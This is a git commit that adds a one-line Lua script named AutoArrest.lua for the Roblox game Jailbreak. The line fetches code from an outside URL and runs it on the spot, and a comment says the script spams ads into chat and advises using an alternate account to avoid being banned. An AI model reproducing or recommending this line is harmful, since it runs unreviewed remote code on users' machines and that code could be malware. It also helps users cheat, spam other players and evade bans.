48e435f83119ae43a0b9992bfcb09565e63aea97
TERI <69073505+TERIHAX@users.noreply.github.com>
2023-04-11 17:54:09 +0100

    Create AutoArrest.lua

---
+++ Games/Jailbreak/AutoArrest.lua
@@ -0,0 +1,3 @@
+-- THIS SENDS TONS OF ADS TO THE CHAT, USE AN ALT TO AVOID GETTING BANNED
+
+pcall(function() loadstring(game:HttpGet('https://scripts.luawl.com/14387/jailbreakautoarrest.lua'))() end)
